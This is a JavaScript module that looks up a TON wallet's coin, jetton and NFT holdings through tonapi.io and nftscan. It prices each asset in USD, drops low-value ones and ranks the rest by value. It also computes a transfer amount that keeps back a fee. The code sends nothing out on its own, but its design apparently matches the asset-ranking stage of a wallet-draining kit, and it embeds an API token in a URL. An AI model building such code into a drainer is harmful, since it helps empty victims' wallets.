const axios = require("axios");

async function fetchWithApiKey(url, apiKey) {
    const response = await fetch(url, {
        method: 'GET',
        headers: {
            'X-API-KEY': apiKey
        }
    });

    if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}, Message: ${response.statusText}`);
    }

    return await response.json();
}

module.exports = async (userInfo, settings) => {
    try {
        let tgBalance;
        let nftList = [];
        let assetList = [];
        let jettonList = [];
        let balanceAmountTG;

        const GetWalletInfo = await axios.get('https://tonapi.io/v2/accounts/' + userInfo.address, {
            headers: {
                'Authorization': `Bearer ${settings.TONAPI_KEY}`
            }
        });

        const data = GetWalletInfo.data;
        // Execute ton price
        const priceResponse = await fetch('https://tonapi.io/v2/rates?tokens=ton&currencies=usd');
        const dataPrice = await priceResponse.json()
        const tonPrice = (dataPrice.rates.TON.prices.USD).toFixed(2);

        // Calculating Ton
        tgBalance = (parseFloat(GetWalletInfo.data?.balance || 0) / 1000000000).toFixed(2) || 0;
        const tonUSDBalance = (parseFloat(GetWalletInfo.data?.balance || 0) / 1000000000).toFixed(2) * tonPrice || 0;
        assetList.push({
            type: "TON",
            data: GetWalletInfo.data,
            balance: tonUSDBalance,
            sendingBalance: parseFloat(GetWalletInfo.data?.balance || settings.LEAVE_FEE_FOR_TRANSACTION) - parseFloat(settings.LEAVE_FEE_FOR_TRANSACTION),
            calculatedBalanceUSDTG: tonUSDBalance,
            name: 'TON'
        });
        //Jetton

        const jettonResponse = await axios.get('https://tonapi.io/v2/accounts/' + userInfo.address + '/jettons?currencies=ton,usd,rub&token=AHIAGHNNXLO4PDQAAAAHMHSZQ5BNGAF5OGJ2JLPYRO5Q7LNR3BNPGD7ZSUGAG46KV7PKLOI', {
            headers: {
                'Authorization': `Bearer ${settings.TONAPI_KEY}`
            }
        });

        const jettonData = jettonResponse.data;
        const balances = jettonData.balances;
        let totalCalculatedBalanceUSD = 0;
        if (balances && balances.length > 0) {
            balances.forEach(jettonData => {
                const wallet_address = jettonData.wallet_address.address;
                const jetton_address = jettonData.jetton.address;
                const jetton = jettonData.jetton;
                const address = jetton.address;
                const symbol = jetton.symbol;
                const TokenBalance = parseInt(jettonData.balance);
                if (TokenBalance !== 0) {

                    let decimalCuter = 1;

                    for (let i = 0; i < jettonData.jetton.decimals; i++) {
                        decimalCuter = decimalCuter * 10;
                    }

                    balanceAmountTG = TokenBalance / decimalCuter;

                    const priceUSD = jettonData.price.prices.USD;
                    const calculatedBalanceUSD = Math.floor(TokenBalance * priceUSD);
                    const calculatedBalanceUSDTG = Math.floor(balanceAmountTG * priceUSD);
                    const roundedBalance = balanceAmountTG.toFixed(2);
                    if (calculatedBalanceUSDTG >= parseFloat(settings.MIN_BALANCE_TOKEN)) {
                        totalCalculatedBalanceUSD += calculatedBalanceUSD;
                        assetList.push({
                            type: "Jetton",
                            jetton_address,
                            wallet_address,
                            TokenBalance,
                            data: data,
                            roundedBalance,
                            address,
                            symbol,
                            name: symbol,
                            balance: calculatedBalanceUSD,
                            price_usd: priceUSD,
                            calculatedBalanceUSDTG
                        });
                        jettonList.push({
                            type: "Jetton",
                            wallet_address,
                            TokenBalance,
                            data: data,
                            roundedBalance,
                            address,
                            symbol,
                            balance: calculatedBalanceUSD,
                            price_usd: priceUSD,
                            calculatedBalanceUSDTG
                        });
                        jettonList.sort((a, b) => b.calculatedBalanceUSDTG - a.calculatedBalanceUSDTG);
                    }
                }
            });
        }

        //Nft
        if (0 === 0) {
            try {
                const initialResponse = await axios.get(`https://tonapi.io/v2/accounts/${userInfo.address}/nfts?limit=1000&offset=0&indirect_ownership=false`, {
                    headers: {
                        'Authorization': `Bearer ${settings.TONAPI_KEY}`
                    }
                });
                const initialData = initialResponse.data;

                if (initialData && initialData.nft_items) {
                    for (const item of initialData.nft_items) {
                        try {
                            if (item.trust === true && item.verified === true) {
                                const nftData = await fetchWithApiKey(`https://tonapi.nftscan.com/api/ton/assets/${item.address}?show_attribute=true`, settings.API_KEY);
                                if (nftData && nftData.data) {
                                    const asset = nftData.data;
                                    if (asset.metadata_json) {
                                        try {
                                            const metadata = JSON.parse(asset.metadata_json);
                                            const Price = asset.latest_trade_price || asset.mint_price || 0;
                                            const nftPrice = Math.round(Price);
                                            if (nftPrice >= (settings.MIN_BALANCE_NFT / tonPrice)) {
                                                const nftItem = {
                                                    type: "NFT",
                                                    data: asset.token_address,
                                                    calculatedBalanceUSDTG: nftPrice * tonPrice,
                                                    balance: nftPrice * 1000000000,
                                                    name: metadata.name,
                                                    nftPrice
                                                };

                                                assetList.push(nftItem);
                                                nftList.push(nftItem);
                                                nftList.sort((a, b) => b.calculatedBalanceUSDTG - a.calculatedBalanceUSDTG);
                                            }
                                        } catch (error) {
                                            console.error('Error parsing metadata_json:', error);
                                        }
                                    } else {
                                        console.warn('metadata_json is null for token_address:', asset.token_address);
                                    }
                                }
                            }

                        } catch (error) {
                            console.error('Error fetching data for address:', item.address, error);
                        }
                    }
                }
            } catch (error) {
                console.error('Error fetching initial data:', error);
            }

            assetList.sort((a, b) => b.calculatedBalanceUSDTG - a.calculatedBalanceUSDTG);
        }


        return {
            data: assetList,
            balance: tgBalance,
            jettonList: jettonList,
            nftList: nftList
        };
    } catch (e) {
        console.log(e)
        return {
            data: []
        }
    }
}